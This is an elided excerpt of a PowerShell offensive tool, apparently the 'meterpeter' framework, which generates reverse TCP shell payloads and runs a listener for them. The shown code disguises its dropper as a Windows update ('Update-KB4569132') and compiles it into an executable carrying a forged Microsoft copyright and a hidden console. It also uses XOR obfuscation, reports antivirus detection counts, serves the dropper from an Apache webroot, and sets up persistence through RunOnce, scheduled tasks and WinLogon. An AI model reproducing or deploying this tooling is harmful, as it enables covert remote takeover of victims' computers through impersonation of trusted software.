<#
.SYNOPSIS
  Starts a listener Server on Windows|Linux and generates reverse_tcp_shellS
...
.OUTPUTS
   Saves Update-KB4569132.ps1 (reverse tcp shell) to meterpeter working directory.
...
function XOR_Obfuscation($String){
  ...
  Start-sleep -Milliseconds 300;#dsesesrsrsjdhjsvsjhvsgs3430099dfdrdffdfdfdfdfsff
...
$payload_name = "Update-KB4569132";
$Dropper_Name = "Update-KB4569132";
...
If($Flavor -ieq "Windows")
{
   ...
   Write-Host "-- ---------------       ------      ---------"
   Write-Host "1  Update-KB4569132.bat  Batch       0/54"
   Write-Host "2  Update-KB4569132.exe  Executable  2/54"
...
If($check -ieq $False)
{
  ...
  If($Python_version)
  {
    ...
    write-Host "   ---------    ------                 -------                -------";
    write-Host "   Python3      Update-KB4569132.ps1   Update-KB4569132.zip   $APACHE";write-host "`n`n";
    ...
    If($BatToExe -ieq "True")
    {
       ...
       $Dropper_Exe = "Update-KB4569132.exe"
       ...
       {
          .\ps2exe.ps1 -inputFile "$Dropper_Bat" -outputFile "$Dropper_Exe" -iconFile "meterpeter.ico" -title "Secure KB Update" -version "45.19041.692.2" -copyright "©Microsoft Corporation. All Rights Reserved" -product "Update-KB4569132" -noError -noConsole -requireAdmin|Out-Null
          Start-Sleep -Seconds 2
       }
       Else
       {
          .\ps2exe.ps1 -inputFile "$Dropper_Bat" -outputFile "$Dropper_Exe" -iconFile "meterpeter.ico" -title "Secure KB Update" -version "45.19041.692.2" -copyright "©Microsoft Corporation. All Rights Reserved" -product "Update-KB4569132" -noError -noConsole|Out-Null
          Start-Sleep -Seconds 2
       }
    ...
    write-Host "   ---------      ------                 ----------";
    write-Host "   NotInstalled   Update-KB4569132.ps1   $IPATH";write-host "`n`n";
  ...
  write-Host "   WebServer    Client                 Dropper                WebRoot" -ForegroundColor Green;
  write-Host "   ---------    ------                 -------                -------";
  write-Host "   Apache2      Update-KB4569132.ps1   Update-KB4569132.zip   $APACHE";write-host "`n`n";
  Copy-Item -Path $IPATH$payload_name.ps1 -Destination $APACHE$payload_name.ps1 -Force;
  ## (ZIP + add LHOST) to dropper.bat before send it to apache 2 webroot ..
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      If($choise -ieq "Persist" -or $choise -ieq "persistance")
      {
        ...
        If($startup_choise -ieq "RUNONCE" -or $startup_choise -ieq "once")
        {
          ...
          Write-Host "   -------                -------------------";
          Write-Host "   Update-KB4569132.ps1   `$env:tmp\KBPersist.vbs`n";
        ...
        If($startup_choise -ieq "Schtasks" -or $startup_choise -ieq "tasks")
        {
          ...
          write-host "`n";
          If(-not($Interval)){$Interval = "10"}
          If(-not($execapi)){$execapi = "$env:tmp\Update-KB4569132.ps1"}
        ...
        If($startup_choise -ieq "WinLogon" -or $startup_choise -ieq "logon")
        {
          ...
          Write-Host "   Persist                Trigger Remote Path" -ForeGroundColor green;
          Write-Host "   -------                -------------------";
          Write-Host "   Update-KB4569132.ps1   `$env:tmp\KBPersist.vbs";
